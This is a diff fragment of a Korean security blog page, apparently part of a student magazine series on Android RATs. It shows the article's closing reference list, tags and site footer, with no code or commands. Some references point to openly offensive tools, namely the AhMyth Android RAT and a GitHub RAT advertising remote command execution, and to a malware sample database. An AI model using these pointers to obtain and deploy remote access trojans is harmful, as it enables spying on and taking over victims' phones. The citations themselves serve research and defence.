+<li><p>[Special Report] 기업과 기관 사칭 악성 APK 현황 및 대응 방안 . (2019). <span class="exturl" data-url="aHR0cHM6Ly9tLmJsb2cubmF2ZXIuY29tL3NraW5mb3NlYzIwMDAvMjIxNjUzODc0ODQ0">https://m.blog.naver.com/skinfosec2000/221653874844</span>.</p>
+</li>
+<li><p>스파이앱 예방수칙 . (연도미상). <span class="exturl" data-url="aHR0cHM6Ly9jeWJlcmJ1cmVhdS5wb2xpY2UuZ28ua3IvbW9iaWxlL3N1Yi9zdWJfMDNfai5qc3A=">https://cyberbureau.police.go.kr/mobile/sub/sub_03_j.jsp</span>.</p>
+</li>
+<li><p>‘경찰 사칭’ 악성 앱 설치하면, 휴대폰 통째로 해커 손에… 피해자는 ‘독 안에 든 쥐’ . (2023). <span class="exturl" data-url="aHR0cHM6Ly9tLmJvYW5uZXdzLmNvbS9odG1sL2RldGFpbC5odG1sP2lkeD0xMTU0NDI=">https://m.boannews.com/html/detail.html?idx=115442</span>.</p>
+</li>
+<li><p>Behavioural biometrics: A survey and classification . (2008). <span class="exturl" data-url="aHR0cHM6Ly93d3cucmVzZWFyY2hnYXRlLm5ldC9wdWJsaWNhdGlvbi8yNDc4MzYwOTNfQmVoYXZpb3VyYWxfYmlvbWV0cmljc19BX3N1cnZleV9hbmRfY2xhc3NpZmljYXRpb24=">https://www.researchgate.net/publication/247836093_Behavioural_biometrics_A_survey_and_classification</span>.</p>
+</li>
+<li><p>McAfee Total Protection for Data Loss Prevention . (2019). <span class="exturl" data-url="aHR0cHM6Ly93d3cudHJlbGxpeC5jb20vZW50ZXJwcmlzZS9lbi11cy9hc3NldHMvc29sdXRpb24tYnJpZWZzL3NiLXRvdGFsLXByb3RlY3Rpb24tZm9yLWRscC5wZGY=">https://www.trellix.com/enterprise/en-us/assets/solution-briefs/sb-total-protection-for-dlp.pdf</span>.</p>
+</li>
+<li><p>Ken Dunham . (n.d.). McAfee Total Protection for Data Loss Prevention (pp. 1~440). n.p.: Syngress.</p>
+</li>
+<li><p>Mark Higgins. (n.d.). Cyber Attack Activity. Symantec Internet Security Threat Report, 3, pp. 8~26.</p>
+</li>
+<li><p>GB WhatsApp APK Download Latest Version Updated Oct 2025 . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly9nYmFwcHMubmV0L2did2hhdHNhcHAtYXBrLWRsLw==">https://gbapps.net/gbwhatsapp-apk-dl/</span>.</p>
+</li>
+<li><p>애플리케이션 샌드박스 . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly9zb3VyY2UuYW5kcm9pZC5jb20vZG9jcy9zZWN1cml0eS9hcHAtc2FuZGJveD9obD1rbw==">https://source.android.com/docs/security/app-sandbox?hl=ko</span>.</p>
+</li>
+<li><p>보안 가이드라인 . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuYW5kcm9pZC5jb20vcHJpdmFjeS1hbmQtc2VjdXJpdHkvc2VjdXJpdHktdGlwcz9obD1rbw==">https://developer.android.com/privacy-and-security/security-tips?hl=ko</span>.</p>
+</li>
+<li><p>Android Application Security - Securing Android Apps for Developers . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly9zbnlrLmlvL2FydGljbGVzL2FwcGxpY2F0aW9uLXNlY3VyaXR5L21vYmlsZS1hcHBsaWNhdGlvbi1zZWN1cml0eS9hbmRyb2lkLWFwcGxpY2F0aW9uLXNlY3VyaXR5Lw==">https://snyk.io/articles/application-security/mobile-application-security/android-application-security/</span>.</p>
+</li>
+<li><p>Understanding and Fighting Against Banking Trojans - The Monitor, Issue 4 . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly93d3cua3JvbGwuY29tL2VuL3B1YmxpY2F0aW9ucy9jeWJlci9tb25pdG9yL2ZpZ2h0aW5nLWFnYWluc3QtYmFua2luZy10cm9qYW5z">https://www.kroll.com/en/publications/cyber/monitor/fighting-against-banking-trojans</span>.</p>
+</li>
+<li><p>Bad Behaviour: How to detect banking trojans . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly93d3cuZ3JvdXAtaWIuY29tL2Jsb2cvYmFua2luZy1tYWx3YXJlLw==">https://www.group-ib.com/blog/banking-malware/</span>.</p>
+</li>
+<li><p>Understanding Banking Trojans: The Malware Behind Financial Loss and Fraud in the Digital Age . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly9jeWJlcnBlZGlhLnJlYXNvbmxhYnMuY29tL0VOL2JhbmtpbmclMjB0cm9qYW5zLmh0bWw=">https://cyberpedia.reasonlabs.com/EN/banking%20trojans.html</span>.</p>
+</li>
+<li><p>Android Remote Administration Tool . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FoTXl0aC9BaE15dGgtQW5kcm9pZC1SQVQ=">https://github.com/AhMyth/AhMyth-Android-RAT</span>.</p>
+</li>
+<li><p>watch how Hackers Remotely Control Any phone?! protect your phone from hackers now! . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1ReFJ5OXNWVU1RVSZsaXN0PUxM">https://www.youtube.com/watch?v=QxRy9sVUMQU&amp;list=LL</span>.</p>
+</li>
+<li><p>what are RATs what to do to avoid them . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly9pdGlnaWMuY29tL2tvL3doYXQtYXJlLXJhdHMtd2hhdC10by1kby10by1hdm9pZC10aGVtLw==">https://itigic.com/ko/what-are-rats-what-to-do-to-avoid-them/</span>.</p>
+</li>
+<li><p>원격 액세스 트로이목마(RAT)란 무엇인가요? . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly93d3cuY2hlY2twb2ludC5jb20va3IvY3liZXItaHViL3RocmVhdC1wcmV2ZW50aW9uL3doYXQtaXMtcmVtb3RlLWFjY2Vzcy10cm9qYW4v">https://www.checkpoint.com/kr/cyber-hub/threat-prevention/what-is-remote-access-trojan/</span>.</p>
+</li>
+<li><p>원격제어 기능의 Gh0st RAT(고스트 렛) 주요기능 . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly9hc2VjLmFobmxhYi5jb20va28vMTMzNC8=">https://asec.ahnlab.com/ko/1334/</span>.</p>
+</li>
+<li><p>Ghost RAT . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly9tYWxwZWRpYS5jYWFkLmZraWUuZnJhdW5ob2Zlci5kZS9kZXRhaWxzL3dpbi5naG9zdF9yYXQ=">https://malpedia.caad.fkie.fraunhofer.de/details/win.ghost_rat</span>.</p>
+</li>
+<li><p>👻 RAT (Remote Access Trojan) - Silent Botnet - Full Remote Command-Line Access - Download &amp; Execute Programs - Spread Virus’ &amp; Malware . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FIWFIvZ2hvc3Q=">https://github.com/AHXR/ghost</span>.</p>
+</li>
+<li><p>MalwareBazaar Database . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly9iYXphYXIuYWJ1c2UuY2gvYnJvd3NlLnBocD9zZWFyY2g9dGFnOkdoMHN0">https://bazaar.abuse.ch/browse.php?search=tag:Gh0st</span>.</p>
+</li>
+<li><p>Part 1 - Understanding the Traffic Pattern of Ghost RAT . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1RcWZ5VTRDNTdHSQ==">https://www.youtube.com/watch?v=QqfyU4C57GI</span>.</p>
+</li>
+<li><p>Aafer, Y., Du, W., &amp; Yin, H. (2013). DroidAPIMiner: Mining API-level features for robust malware detection in Android. Proceedings of the 9th International Conference on Security and Privacy in Communication Systems (SecureComm 2013), 86–103. Springer. <span class="exturl" data-url="aHR0cHM6Ly9kb2kub3JnLzEwLjEwMDcvOTc4LTMtMzE5LTA0MjgzLTFfNg==">https://doi.org/10.1007/978-3-319-04283-1_6</span></p>
+</li>
+<li><p>Open-Source Gh0st RAT Still Haunting Inboxes 15 Years After Release . (n.d.). <span class="exturl" data-url="aHR0cHM6Ly9jb2ZlbnNlLmNvbS9ibG9nL29wZW4tc291cmNlLWdoMHN0LXJhdC1zdGlsbC1oYXVudGluZy1pbmJveGVzLTE1LXllYXJzLWFmdGVyLXJlbGVhc2Uv">https://cofense.com/blog/open-source-gh0st-rat-still-haunting-inboxes-15-years-after-release/</span>.</p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C/" rel="tag"># 안드로이드</a>
+              <a href="/tags/apk/" rel="tag"># apk</a>
+              <a href="/tags/RAT/" rel="tag"># RAT</a>
+              <a href="/tags/%EC%95%85%EC%84%B1%EC%BD%94%EB%93%9C/" rel="tag"># 악성코드</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/09/30/313202_250930/" rel="prev" title="[2025 SWING magazine] Android + RAT(2)">
+                  <i class="fa fa-angle-left"></i> [2025 SWING magazine] Android + RAT(2)
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/10/11/3211_251011/" rel="next" title="[2025 SWING magazine] XSS">
+                  [2025 SWING magazine] XSS <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy;
+    
+      2024 – <span itemprop="copyrightYear">2026</span>
+    
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">SWING</span>
+  </div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
